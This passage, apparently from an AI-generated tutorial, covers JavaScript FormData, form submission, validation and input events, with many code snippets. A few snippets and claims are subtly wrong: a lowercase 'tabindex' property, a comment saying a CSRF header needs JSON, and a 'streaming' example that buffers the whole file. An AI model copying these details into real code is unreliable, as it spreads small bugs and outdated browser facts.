if (!ALLOWED_TYPES.includes(file.type)) {
  alert('Invalid file type');
  return;
}

fd.append('upload', file);
```

**Critical**: Client-side validation is bypassable. Always validate file type, size, and content on the server.

#### CSRF Protection

```javascript
// Include CSRF token in FormData
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fd.append('_csrf', csrfToken);

// Or use custom header (requires JSON, not FormData)
fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: fd
});
```

#### Content Security and Sanitization

```javascript
// Sanitize text inputs before appending
function sanitizeInput(value) {
  const div = document.createElement('div');
  div.textContent = value;
  return div.innerHTML;
}

fd.append('username', sanitizeInput(userInput));
```

**[Inference]** Server-side sanitization remains necessary regardless of client-side measures.

### Performance Optimization

#### Large File Handling

```javascript
// Check file size before appending
const largeFile = fileInput.files[0];

if (largeFile.size > 100 * 1024 * 1024) { // 100MB
  // Consider chunked upload strategy instead
  uploadFileInChunks(largeFile);
} else {
  fd.append('file', largeFile);
}
```

#### Memory Considerations

FormData holds file references, not copies. Memory impact depends on file sizes:

```javascript
// Multiple large files
const files = fileInput.files;
const fd = new FormData();

// All files reference original File objects
// No significant memory duplication
for (const file of files) {
  fd.append('files[]', file);
}
```

**[Inference]** FormData itself is lightweight; memory consumption primarily depends on the referenced File/Blob objects.

#### Streaming Alternatives

For very large uploads or progress tracking:

```javascript
// ReadableStream for large file uploads
async function uploadWithProgress(file) {
  const reader = file.stream().getReader();
  const chunks = [];
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(value);
    // Report progress
  }
  
  const blob = new Blob(chunks);
  fd.append('file', blob, file.name);
}
```

### Testing and Debugging

#### Inspecting FormData Contents

```javascript
// Log all entries
console.log('FormData contents:');
for (const [key, value] of fd.entries()) {
  if (value instanceof File) {
    console.log(`${key}: File(${value.name}, ${value.size} bytes, ${value.type})`);
  } else if (value instanceof Blob) {
    console.log(`${key}: Blob(${value.size} bytes, ${value.type})`);
  } else {
    console.log(`${key}: ${value}`);
  }
}

// Count entries
let entryCount = 0;
for (const _ of fd) entryCount++;
console.log(`Total entries: ${entryCount}`);
```

#### Mock FormData for Testing

```javascript
// Create test FormData with mock files
const mockFile = new File(['test content'], 'test.txt', { type: 'text/plain' });
const testFd = new FormData();
testFd.append('file', mockFile);
testFd.append('username', 'testuser');

// Verify contents
expect(testFd.get('username')).toBe('testuser');
expect(testFd.get('file')).toBeInstanceOf(File);
```

### Common Pitfalls

#### Forgotten Content-Type

```javascript
// WRONG: Manually setting Content-Type
fetch('/api/upload', {
  method: 'POST',
  headers: {
    'Content-Type': 'multipart/form-data' // Missing boundary!
  },
  body: fd
});

// CORRECT: Omit Content-Type for FormData
fetch('/api/upload', {
  method: 'POST',
  body: fd // Browser sets correct header with boundary
});
```

#### Converting to String

```javascript
// WRONG: FormData.toString() doesn't serialize data
console.log(fd.toString()); // "[object FormData]"

// CORRECT: Iterate to inspect
for (const pair of fd.entries()) {
  console.log(pair);
}
```

#### Assuming Synchronous File Reading

```javascript
// WRONG: File content isn't immediately available as text
const file = fileInput.files[0];
console.log(file.text()); // Returns Promise, not string

// CORRECT: Use async/await
const text = await file.text();
console.log(text);
```

### Framework Integration

#### React Example

```javascript
function UploadForm() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    const form = e.target;
    const fd = new FormData(form);
    
    // Add React state values not in form
    fd.append('user_id', userId);
    
    const response = await fetch('/api/upload', {
      method: 'POST',
      body: fd
    });
    
    const result = await response.json();
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input name="title" required />
      <input type="file" name="file" required />
      <button type="submit">Upload</button>
    </form>
  );
}
```

#### Vue Example

```javascript
export default {
  methods: {
    async handleSubmit() {
      const form = this.$refs.form;
      const fd = new FormData(form);
      
      // Add component data
      fd.append('extra_data', this.extraData);
      
      await fetch('/api/upload', {
        method: 'POST',
        body: fd
      });
    }
  }
}
```

#### Axios Integration

```javascript
const fd = new FormData();
fd.append('file', fileInput.files[0]);

axios.post('/api/upload', fd, {
  headers: {
    // Axios sets correct Content-Type automatically
  },
  onUploadProgress: (progressEvent) => {
    const percentCompleted = Math.round(
      (progressEvent.loaded * 100) / progressEvent.total
    );
    console.log(percentCompleted);
  }
});
```

### Alternative Encoding Formats

#### When to Use application/x-www-form-urlencoded

```javascript
// For simple text data without files
const params = new URLSearchParams();
params.append('username', 'john');
params.append('email', 'john@example.com');

fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: params
});
```

URL-encoded format is more compact for text-only data but cannot handle binary files.

#### When to Use application/json

```javascript
// For complex nested structures without files
const data = {
  user: {
    name: 'John',
    preferences: {
      theme: 'dark',
      notifications: ['email', 'sms']
    }
  }
};

fetch('/api/endpoint', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});
```

JSON encoding preserves data types and nesting but cannot directly include files (requires base64 encoding or separate upload).

### Specification and Standards

FormData is defined in the XMLHttpRequest specification and the Fetch specification. The interface is part of the WHATWG standards and continues to evolve with web platform capabilities.

**[Unverified]** Future enhancements may include standardized nested object syntax or improved streaming capabilities, but specific roadmap items are subject to change based on working group consensus.

---

## Form Submission Handling

### Core Submission Mechanisms

Forms submit through three primary triggers:

1. **Submit button click**: `<button type="submit">` or `<input type="submit">`
2. **Enter key**: In text-like input fields (not `textarea` by default)
3. **Programmatic**: `form.submit()` method

### The submit Event

The `submit` event fires on the `<form>` element when submission is triggered.

```javascript
form.addEventListener('submit', (event) => {
  // Handle submission
});
```

**Critical characteristics:**

- Fires **before** data is sent
- Bubbles: Yes
- Cancelable: Yes
- Default action: Send form data to server and navigate

### Preventing Default Submission

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault();
  // Custom handling without page navigation
});
```

**When to prevent default:**

- AJAX/fetch submissions
- Client-side validation
- Single-page application behavior
- Custom data processing before submission

**When NOT to prevent default:**

- Standard server-side form processing
- File downloads via form submission
- Traditional multi-page applications

### Form Data Access

#### FormData API

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  const formData = new FormData(event.target);
  
  // Iterate entries
  for (const [name, value] of formData.entries()) {
    console.log(name, value);
  }
  
  // Get single value
  const username = formData.get('username');
  
  // Get all values for name (checkboxes, multiple selects)
  const hobbies = formData.getAll('hobby');
  
  // Check if field exists
  const hasEmail = formData.has('email');
});
```

**FormData methods:**

- `get(name)`: Returns first value for field
- `getAll(name)`: Returns array of all values
- `set(name, value)`: Set/overwrite field value
- `append(name, value)`: Add value (allows duplicates)
- `delete(name)`: Remove field
- `has(name)`: Check existence
- `entries()`: Iterator of `[name, value]` pairs
- `keys()`: Iterator of field names
- `values()`: Iterator of field values

#### Direct Element Access

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  // Via form.elements collection
  const username = form.elements.username.value;
  const email = form.elements['user-email'].value;
  
  // Via name attribute indexing
  const password = form.password.value;
  
  // Via querySelector
  const terms = form.querySelector('[name="terms"]').checked;
});
```

**form.elements specifics:**

- Contains all form controls (inputs, selects, textareas, buttons)
- Indexed by `name` attribute, not `id`
- Returns NodeList for multiple elements with same name
- Includes disabled elements

### Validation Handling

#### HTML5 Constraint Validation

**Built-in validation attributes:**

- `required`: Field must have value
- `type`: Email, URL, number format validation
- `pattern`: Regex validation
- `min`, `max`: Numeric/date ranges
- `minlength`, `maxlength`: String length
- `step`: Numeric increment

```html
<input type="email" name="email" required>
<input type="number" name="age" min="18" max="120">
<input type="text" name="username" pattern="[a-zA-Z0-9]{3,16}">
```

**Validation states:**

```javascript
const input = form.elements.email;

// Check validity
input.validity.valid; // boolean: overall validity
input.validity.valueMissing; // required field empty
input.validity.typeMismatch; // doesn't match type (e.g., invalid email)
input.validity.patternMismatch; // doesn't match pattern
input.validity.tooShort; // below minlength
input.validity.tooLong; // above maxlength
input.validity.rangeUnderflow; // below min
input.validity.rangeOverflow; // above max
input.validity.stepMismatch; // doesn't match step
input.validity.badInput; // browser can't parse (rare)
input.validity.customError; // setCustomValidity() called

// Get validation message
input.validationMessage; // String describing error

// Check form validity
form.checkValidity(); // Returns boolean, doesn't show UI
form.reportValidity(); // Returns boolean, shows native validation UI
```

#### Custom Validation

```javascript
form.addEventListener('submit', (event) => {
  const password = form.elements.password;
  const confirm = form.elements.passwordConfirm;
  
  if (password.value !== confirm.value) {
    event.preventDefault();
    confirm.setCustomValidity('Passwords must match');
    confirm.reportValidity(); // Show error
  } else {
    confirm.setCustomValidity(''); // Clear error
  }
});

// Clear custom validity on input
form.elements.passwordConfirm.addEventListener('input', (event) => {
  event.target.setCustomValidity('');
});
```

**setCustomValidity() behavior:**

- Non-empty string: Makes field invalid
- Empty string: Clears custom error
- Persists until cleared
- Prevents form submission

#### Validation Timing

```javascript
// Validate on blur (after user leaves field)
input.addEventListener('blur', (event) => {
  if (!event.target.validity.valid) {
    event.target.reportValidity();
  }
});

// Live validation on input
input.addEventListener('input', (event) => {
  event.target.setCustomValidity(''); // Clear previous errors
  
  if (event.target.value.length < 8) {
    event.target.setCustomValidity('Must be at least 8 characters');
  }
});

// Validate entire form before submit
form.addEventListener('submit', (event) => {
  if (!form.checkValidity()) {
    event.preventDefault();
    form.reportValidity(); // Show all errors
  }
});
```

#### Preventing HTML5 Validation

```html
<!-- Disable for entire form -->
<form novalidate>

<!-- Or in JavaScript -->
<script>
form.noValidate = true;
</script>
```

Use when implementing fully custom validation UI.

### Submission Methods

#### AJAX with fetch

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  
  try {
    const response = await fetch(form.action || '/submit', {
      method: form.method || 'POST',
      body: formData
      // Browser sets Content-Type: multipart/form-data automatically
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const result = await response.json();
    // Handle success
  } catch (error) {
    // Handle error
  }
});
```

#### JSON Submission

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  const data = Object.fromEntries(formData.entries());
  
  // Handle multiple values (checkboxes)
  const hobbies = formData.getAll('hobby');
  if (hobbies.length) data.hobby = hobbies;
  
  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
});
```

#### URLSearchParams for URL-encoded

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  const params = new URLSearchParams(formData);
  
  const response = await fetch('/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: params
  });
});
```

#### Programmatic Submission

```javascript
// Bypasses submit event - does NOT fire listeners
form.submit();

// To trigger submit event programmatically
form.requestSubmit(); // Modern, fires submit event
form.requestSubmit(submitButton); // Specify which button triggered it

// Or manually dispatch
form.dispatchEvent(new Event('submit', { 
  bubbles: true, 
  cancelable: true 
}));
```

**[Inference]** `requestSubmit()` differs from `submit()` by respecting validation and firing the submit event, making it suitable for programmatic triggers that should behave like user actions.

### File Uploads

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  const fileInput = form.elements.avatar;
  
  // Check if file selected
  if (fileInput.files.length === 0) {
    alert('Please select a file');
    return;
  }
  
  const file = fileInput.files[0];
  
  // Validate file
  if (file.size > 5 * 1024 * 1024) { // 5MB
    alert('File too large');
    return;
  }
  
  if (!file.type.startsWith('image/')) {
    alert('Must be an image');
    return;
  }
  
  // FormData handles files automatically
  await fetch('/upload', {
    method: 'POST',
    body: formData
  });
});
```

**Multiple file handling:**

```javascript
const fileInput = form.elements.photos; // <input type="file" multiple>

for (const file of fileInput.files) {
  formData.append('photos', file);
}
```

### Submit Button Identification

```javascript
form.addEventListener('submit', (event) => {
  // Get the button that triggered submission
  const submitter = event.submitter;
  
  if (submitter) {
    console.log(submitter.name); // Button's name attribute
    console.log(submitter.value); // Button's value attribute
  }
});
```

**Use cases:**

- Multiple submit buttons with different actions
- Draft vs. publish buttons
- "Save" vs. "Save and Continue"

```html
<button type="submit" name="action" value="draft">Save Draft</button>
<button type="submit" name="action" value="publish">Publish</button>
```

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  const action = event.submitter.value;
  if (action === 'draft') {
    saveDraft();
  } else if (action === 'publish') {
    publish();
  }
});
```

### User Experience Patterns

#### Loading States

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const submitButton = event.submitter;
  const originalText = submitButton.textContent;
  
  // Disable form
  submitButton.disabled = true;
  submitButton.textContent = 'Submitting...';
  
  // Disable all inputs
  for (const element of form.elements) {
    element.disabled = true;
  }
  
  try {
    await fetch('/submit', {
      method: 'POST',
      body: new FormData(form)
    });
    
    // Success handling
  } catch (error) {
    // Error handling
  } finally {
    // Re-enable form
    submitButton.disabled = false;
    submitButton.textContent = originalText;
    
    for (const element of form.elements) {
      element.disabled = false;
    }
  }
});
```

#### Error Display

```javascript
async function handleSubmit(event) {
  event.preventDefault();
  
  // Clear previous errors
  form.querySelectorAll('.error').forEach(el => el.remove());
  
  try {
    const response = await fetch('/submit', {
      method: 'POST',
      body: new FormData(form)
    });
    
    if (!response.ok) {
      const errors = await response.json();
      displayErrors(errors);
    }
  } catch (error) {
    displayGeneralError(error.message);
  }
}

function displayErrors(errors) {
  // errors format: { fieldName: "Error message" }
  for (const [fieldName, message] of Object.entries(errors)) {
    const field = form.elements[fieldName];
    if (field) {
      const error = document.createElement('div');
      error.className = 'error';
      error.textContent = message;
      field.parentElement.appendChild(error);
      field.setAttribute('aria-invalid', 'true');
    }
  }
}
```

#### Success Feedback

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const response = await fetch('/submit', {
    method: 'POST',
    body: new FormData(form)
  });
  
  if (response.ok) {
    // Option 1: Show success message
    showSuccessMessage('Form submitted successfully!');
    
    // Option 2: Reset form
    form.reset();
    
    // Option 3: Redirect
    window.location.href = '/success';
    
    // Option 4: Replace form with confirmation
    form.innerHTML = '<p class="success">Thank you for your submission!</p>';
  }
});
```

### Form Reset Handling

```javascript
form.addEventListener('reset', (event) => {
  // Fires when form.reset() called or reset button clicked
  // Can be prevented with event.preventDefault()
  
  // Clear custom error states
  form.querySelectorAll('.error').forEach(el => el.remove());
  form.querySelectorAll('[aria-invalid]').forEach(el => {
    el.removeAttribute('aria-invalid');
  });
});

// Programmatic reset
form.reset(); // Fires reset event, resets to default values
```

**Default values:**

- Input/textarea: Value from `value` attribute in HTML
- Checkbox/radio: Checked state from `checked` attribute
- Select: Selected state from `selected` attribute

### Input Events During Submission

**Event sequence:**

1. User clicks submit button
2. `click` event on button
3. `submit` event on form
4. If not prevented, browser submits

**Input change events:**

```javascript
// Fires on every keystroke
input.addEventListener('input', (event) => {
  // Real-time validation or character counting
});

// Fires when value changes AND field loses focus
input.addEventListener('change', (event) => {
  // Debounced validation
});

// Fires when field loses focus
input.addEventListener('blur', (event) => {
  // Field-level validation
});
```

### Autofill and Autocomplete

```html
<!-- Enable autofill with standard names -->
<input name="email" autocomplete="email">
<input name="tel" autocomplete="tel">
<input name="cc-number" autocomplete="cc-number">

<!-- Disable autocomplete -->
<input name="otp" autocomplete="off">
<form autocomplete="off">
```

**Detecting autofill:**

```javascript
// Modern approach (limited support)
input.addEventListener('change', (event) => {
  // May fire when browser autofills
});

// Monitoring approach
const observer = new MutationObserver(() => {
  // Check if value changed
  if (input.value !== previousValue) {
    handleAutofill();
  }
});

observer.observe(input, {
  attributes: true,
  attributeFilter: ['value']
});
```

**[Unverified]** Reliable autofill detection remains challenging across browsers due to inconsistent event firing behavior.

### Security Considerations

#### CSRF Protection

```javascript
// Include CSRF token in submission
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  
  // Token from meta tag or hidden input
  const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
  
  await fetch('/submit', {
    method: 'POST',
    headers: {
      'X-CSRF-Token': csrfToken
    },
    body: formData
  });
});
```

#### Input Sanitization

**Client-side sanitization is NOT security** - always validate server-side.

```javascript
form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  // Trim whitespace
  const username = form.elements.username.value.trim();
  
  // Basic XSS prevention for display (NOT for storage)
  const displayName = username
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  
  // Submit sanitized data
});
```

#### Rate Limiting

```javascript
let lastSubmit = 0;
const MIN_INTERVAL = 1000; // 1 second

form.addEventListener('submit', (event) => {
  const now = Date.now();
  
  if (now - lastSubmit < MIN_INTERVAL) {
    event.preventDefault();
    alert('Please wait before submitting again');
    return;
  }
  
  lastSubmit = now;
  // Continue with submission
});
```

### Dynamic Form Manipulation

#### Adding Fields Programmatically

```javascript
function addPhoneField() {
  const container = document.getElementById('phones');
  const input = document.createElement('input');
  input.type = 'tel';
  input.name = 'phone[]'; // Array notation for multiple values
  input.required = true;
  container.appendChild(input);
}

// FormData automatically handles multiple fields with same name
form.addEventListener('submit', (event) => {
  event.preventDefault();
  const formData = new FormData(form);
  const phones = formData.getAll('phone[]'); // Returns array
});
```

#### Conditional Required Fields

```javascript
const countrySelect = form.elements.country;
const stateInput = form.elements.state;

countrySelect.addEventListener('change', (event) => {
  if (event.target.value === 'US') {
    stateInput.required = true;
  } else {
    stateInput.required = false;
    stateInput.setCustomValidity(''); // Clear any validation errors
  }
});
```

### Form Serialization Patterns

#### Convert to Object

```javascript
function formToObject(form) {
  const formData = new FormData(form);
  const obj = {};
  
  for (const [key, value] of formData.entries()) {
    // Handle multiple values (checkboxes)
    if (obj[key]) {
      // Convert to array if multiple values
      obj[key] = Array.isArray(obj[key]) 
        ? [...obj[key], value]
        : [obj[key], value];
    } else {
      obj[key] = value;
    }
  }
  
  return obj;
}
```

#### Nested Objects

```javascript
function formToNestedObject(form) {
  const formData = new FormData(form);
  const obj = {};
  
  for (const [key, value] of formData.entries()) {
    // Support bracket notation: user[name], user[email]
    const keys = key.split(/[\[\]]+/).filter(Boolean);
    let current = obj;
    
    for (let i = 0; i < keys.length - 1; i++) {
      if (!current[keys[i]]) current[keys[i]] = {};
      current = current[keys[i]];
    }
    
    current[keys[keys.length - 1]] = value;
  }
  
  return obj;
}

// Usage with <input name="user[email]">
// Results in: { user: { email: "..." } }
```

### Multi-Step Forms

```javascript
let currentStep = 1;
const totalSteps = 3;

form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  // Validate current step
  const stepValid = validateStep(currentStep);
  
  if (!stepValid) return;
  
  if (currentStep < totalSteps) {
    // Move to next step
    hideStep(currentStep);
    currentStep++;
    showStep(currentStep);
  } else {
    // Final submission
    submitForm();
  }
});

function validateStep(step) {
  const stepFields = form.querySelectorAll(`[data-step="${step}"]`);
  
  for (const field of stepFields) {
    if (!field.validity.valid) {
      field.reportValidity();
      return false;
    }
  }
  
  return true;
}
```

### Accessibility Considerations

```html
<!-- Associate errors with fields -->
<input 
  id="email" 
  name="email" 
  aria-describedby="email-error"
  aria-invalid="false">
<div id="email-error" class="error" role="alert"></div>

<!-- Loading state announcement -->
<form aria-busy="false">
  <!-- When submitting, set aria-busy="true" -->
</form>

<!-- Required field indication -->
<label for="username">
  Username <span aria-label="required">*</span>
</label>
<input id="username" name="username" required>
```

```javascript
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  // Announce loading state to screen readers
  form.setAttribute('aria-busy', 'true');
  
  try {
    await submitData();
    
    // Announce success
    announceToScreenReader('Form submitted successfully');
  } catch (error) {
    // Announce error
    announceToScreenReader('Form submission failed: ' + error.message);
  } finally {
    form.setAttribute('aria-busy', 'false');
  }
});

function announceToScreenReader(message) {
  const liveRegion = document.getElementById('aria-live');
  liveRegion.textContent = message;
}
```

### Edge Cases and Gotchas

#### 1. Submit button name/value inclusion

Submit button's name/value only included in FormData if it triggered submission:

```javascript
const formData = new FormData(form); // Submit button NOT included

// Include specific button
const button = form.querySelector('[name="action"]');
const formData = new FormData(form, button); // Button included
```

#### 2. Disabled fields excluded

```javascript
input.disabled = true;

const formData = new FormData(form);
formData.has('fieldName'); // false - disabled fields excluded
```

#### 3. Form outside form element

```html
<input form="myForm" name="external">
<form id="myForm">
  <!-- This input is associated with the form -->
</form>
```

FormData includes fields with matching `form` attribute.

#### 4. Multiple forms on page

```javascript
// Don't assume form reference
document.addEventListener('submit', (event) => {
  event.preventDefault(); // Affects ALL forms
});

// Be specific
document.getElementById('myForm').addEventListener('submit', handler);
```

#### 5. Enter key submission nuances

- Enter in `<textarea>` does NOT submit (creates new line)
- Enter in text input submits if form has submit button
- Enter with no submit button: no submission
- `<button>` without `type` defaults to `type="submit"`

#### 6. FormData with same-name fields

```javascript
// Multiple checkboxes with same name
formData.get('hobby'); // Returns first value only
formData.getAll('hobby'); // Returns array of all values
```

#### 7. File input reset behavior

```javascript
form.reset(); // Clears file input
fileInput.value = ''; // Also clears, but safer cross-browser
fileInput.value = 'C:\\fakepath\\file.txt'; // Throws error - read-only
```

#### 8. Submit during submission

```javascript
let isSubmitting = false;

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  if (isSubmitting) return; // Prevent concurrent submissions
  isSubmitting = true;
  
  try {
    await submitData();
  } finally {
    isSubmitting = false;
  }
});
```

### Performance Optimization

#### Debounced Validation

```javascript
let validationTimeout;

input.addEventListener('input', (event) => {
  clearTimeout(validationTimeout);
  
  validationTimeout = setTimeout(() => {
    validateField(event.target);
  }, 300); // Wait 300ms after user stops typing
});
```

#### Lazy Validation Loading

```javascript
let validationRules = null;

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  // Load validation rules only when needed
  if (!validationRules) {
    validationRules = await import('./validation-rules.js');
  }
  
  const isValid = validationRules.validate(form);
  if (isValid) submitForm();
});
```

#### Virtual Form Submission (No Network)

```javascript
// Test submission handling without server
form.addEventListener('submit', (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  console.log('Would submit:', Object.fromEntries(formData));
  
  // Simulate success
  setTimeout(() => {
    showSuccess();
  }, 1000);
});
```

---

## Input Events

### The `input` Event

#### Firing Behavior

The `input` event fires synchronously whenever the value of an `<input>`, `<textarea>`, or `<select>` element changes through user interaction. This event fires immediately with each modification, making it the primary event for real-time value tracking.

For text inputs, `input` fires on every character addition or deletion, including typing, pasting, cutting, dragging text, voice input, and IME composition. For `<select>` elements, it fires when the selection changes. For checkboxes and radio buttons, it fires when the checked state changes.

#### Key Characteristic: User-Initiated Only

The `input` event **only** fires for changes initiated by user interaction. Programmatic value changes via JavaScript (`element.value = "new value"`) do **not** trigger `input` events. This is intentional behavior to prevent infinite loops and distinguish between user actions and script modifications.

```javascript
const textInput = document.querySelector('input[type="text"]');

textInput.addEventListener('input', (e) => {
  console.log('Current value:', e.target.value);
  // Fires on every keystroke, paste, etc.
});

// This does NOT trigger the input event
textInput.value = "programmatic change";
```

#### Event Properties

The `InputEvent` interface extends the base `Event` with specific properties:

**`data`** - Contains the inserted text for insertion operations. For deletions, this is `null`. For non-text input (like selecting from a dropdown), this may also be `null`.

**`dataTransfer`** - A `DataTransfer` object for operations involving rich content (paste, drag-drop). Contains information about transferred data formats.

**`inputType`** - A string describing the type of input action. This provides granular detail about what caused the input:

- `"insertText"` - Typing characters
- `"insertFromPaste"` - Pasting content
- `"insertFromDrop"` - Dropping content
- `"deleteContentBackward"` - Backspace key
- `"deleteContentForward"` - Delete key
- `"deleteByCut"` - Cut operation
- `"insertLineBreak"` - Enter key in textarea
- `"insertParagraph"` - Enter key creating new paragraph
- `"historyUndo"` - Undo operation (Ctrl+Z)
- `"historyRedo"` - Redo operation (Ctrl+Y)

Additional `inputType` values exist for formatting operations in `contenteditable` elements (bold, italic, indent, etc.).

**`isComposing`** - Boolean indicating whether the event is part of a composition session (IME input for languages like Chinese, Japanese, Korean). When `true`, the text is still being composed and not finalized.

#### Bubbles and Cancelable

The `input` event **bubbles**, allowing delegation from parent elements. However, it is **not cancelable** - calling `preventDefault()` has no effect. The input has already occurred by the time the event fires. To prevent input, use the `beforeinput` event instead.

#### Relationship with Composition Events

During IME composition, the `input` event interacts with composition events:

1. `compositionstart` fires when composition begins
2. Multiple `input` events fire with `isComposing: true` as the composition updates
3. `compositionend` fires when composition finalizes
4. A final `input` event fires with `isComposing: false` containing the finalized text

```javascript
textInput.addEventListener('input', (e) => {
  if (e.isComposing) {
    console.log('Still composing:', e.data);
    return; // Often want to wait for final input
  }
  console.log('Finalized input:', e.target.value);
});
```

#### Use Cases

Real-time validation, character counters, search-as-you-type, auto-saving, live preview, and any scenario requiring immediate response to value changes. The `input` event is preferred over `keydown`/`keyup` because it captures all input methods uniformly, including mobile keyboards, voice input, clipboard operations, and IME composition.

#### Performance Considerations

Because `input` fires on every character change, intensive operations (network requests, heavy computations) should be debounced or throttled:

```javascript
let timeoutId;
textInput.addEventListener('input', (e) => {
  clearTimeout(timeoutId);
  timeoutId = setTimeout(() => {
    performExpensiveOperation(e.target.value);
  }, 300);
});
```

### The `beforeinput` Event

#### Timing and Cancelability

The `beforeinput` event fires **before** the DOM is modified and **before** the `input` event. Critically, `beforeinput` is **cancelable** - calling `preventDefault()` prevents the input action entirely. This makes it the appropriate event for preventing unwanted input.

```javascript
textInput.addEventListener('beforeinput', (e) => {
  // Only allow digits
  if (e.inputType === 'insertText' && !/^\d$/.test(e.data)) {
    e.preventDefault(); // Block non-digit input
  }
});
```

#### Event Properties

`beforeinput` uses the same `InputEvent` interface as `input`, providing `data`, `dataTransfer`, `inputType`, and `isComposing` properties. The difference is timing: these properties describe the **proposed** change that hasn't occurred yet.

#### Browser Support Limitations

Browser support for `beforeinput` is incomplete. Safari and Chrome have full support, but Firefox implementation has been incomplete or inconsistent [Unverified - browser support status changes frequently]. When `beforeinput` is unavailable, input restriction typically requires combining `keydown` event filtering with `input` event correction.

#### Target Ranges

The `getTargetRanges()` method (when supported) returns the DOM ranges that would be affected by the input. This is primarily useful for `contenteditable` elements where you need to know which portions of the content are being modified.

### The `change` Event

#### Firing Conditions by Element Type

The `change` event firing behavior differs significantly based on element type:

**Text inputs (`<input type="text">`, `<textarea>`, `<input type="email">`, etc.):** Fires only when the element **loses focus** (blur) **and** the value has changed since focus was gained. This means typing multiple characters fires only one `change` event when you tab away or click elsewhere.

```javascript
textInput.addEventListener('change', (e) => {
  console.log('Final value after blur:', e.target.value);
  // Fires once when user leaves the field
});
```

**Checkboxes and radio buttons:** Fires **immediately** when the checked state changes via user interaction. No blur required.

```javascript
checkbox.addEventListener('change', (e) => {
  console.log('Checked:', e.target.checked);
  // Fires immediately on click
});
```

**Select dropdowns:** Fires **immediately** when a different option is selected. No blur required.

```javascript
selectElement.addEventListener('change', (e) => {
  console.log('Selected value:', e.target.value);
  // Fires immediately on selection change
});
```

**Range inputs (`<input type="range">`):** Firing behavior varies by browser [Unverified]. Some browsers fire continuously during dragging, others only on release. For consistent behavior during dragging, use `input` event instead.

**File inputs (`<input type="file">`):** Fires when file selection is confirmed (dialog is closed with a selection made).

**Date/time inputs:** Typically fire when the picker is closed with a new value, though exact timing can vary by browser and input type [Inference].

#### Event Properties

The `change` event uses the base `Event` interface, not `InputEvent`. It does not include `data` or `inputType` properties. Access the changed value via `e.target.value` or `e.target.checked`.

#### Bubbles and Cancelable

The `change` event **bubbles**, enabling event delegation. It is **not cancelable** - the change has already occurred. To prevent changes, you must use validation and potentially revert the value programmatically.

#### Programmatic Changes

Like `input`, the `change` event does **not** fire for programmatic value changes via JavaScript:

```javascript
// Does NOT trigger change event
textInput.value = "new value";
selectElement.selectedIndex = 2;
checkbox.checked = true;
```

To manually dispatch a `change` event after programmatic modification:

```javascript
textInput.value = "new value";
textInput.dispatchEvent(new Event('change', { bubbles: true }));
```

#### Use Cases

Form validation on field completion, saving data when user finishes editing, triggering dependent field updates (cascading dropdowns), and any scenario where you want to respond to finalized changes rather than every keystroke. For text inputs, `change` is more efficient than `input` when real-time updates aren't necessary.

#### Input vs Change Decision

Use `input` when you need immediate, real-time response to every modification. Use `change` when you only care about the final value after user completes their edit (for text) or when state actually changes (for checkboxes, selects).

### The `focus` Event

#### Focus Acquisition

The `focus` event fires when an element receives keyboard focus. Focus can be acquired through:

- Mouse/touch click on a focusable element
- Tab key navigation
- Programmatic `element.focus()` call
- Access key activation (Alt+key)
- Automatic focus on page load (autofocus attribute)

#### Focusable Elements

Not all elements are focusable by default. Naturally focusable elements include:

- Form controls: `<input>`, `<textarea>`, `<select>`, `<button>`
- Links: `<a>` with `href` attribute
- Media: `<audio>`, `<video>` with `controls` attribute
- Interactive: `<iframe>`, `<details>`, `<summary>`

Make non-focusable elements focusable by setting `tabindex`:

- `tabindex="0"` - Adds element to natural tab order
- `tabindex="-1"` - Makes programmatically focusable but removes from tab order
- `tabindex="1+"` - Defines explicit tab order (generally discouraged [Inference - based on accessibility best practices])

```javascript
const div = document.querySelector('div');
div.tabindex = 0; // Now focusable

div.addEventListener('focus', () => {
  console.log('Div received focus');
});
```

#### Event Properties

The `FocusEvent` interface extends `UIEvent` and includes:

**`relatedTarget`** - The element that previously had focus (when focusing) or will receive focus (when blurring). This is `null` when:

- Focus moves from outside the document
- Focus moves to outside the document
- The related element is in a different document/window
- Privacy/security restrictions prevent access

```javascript
input.addEventListener('focus', (e) => {
  console.log('Gained focus from:', e.relatedTarget);
  // Useful for tracking focus flow
});
```

#### Does Not Bubble

The `focus` event **does not bubble**. This means event listeners on parent elements do not receive `focus` events from child elements:

```javascript
form.addEventListener('focus', () => {
  // This will NOT fire when inputs inside the form gain focus
});
```

For bubbling focus detection, use `focusin` instead (covered below).

#### Not Cancelable

The `focus` event is **not cancelable**. You cannot prevent an element from receiving focus by calling `preventDefault()` on the focus event. Focus has already been transferred by the time the event fires.

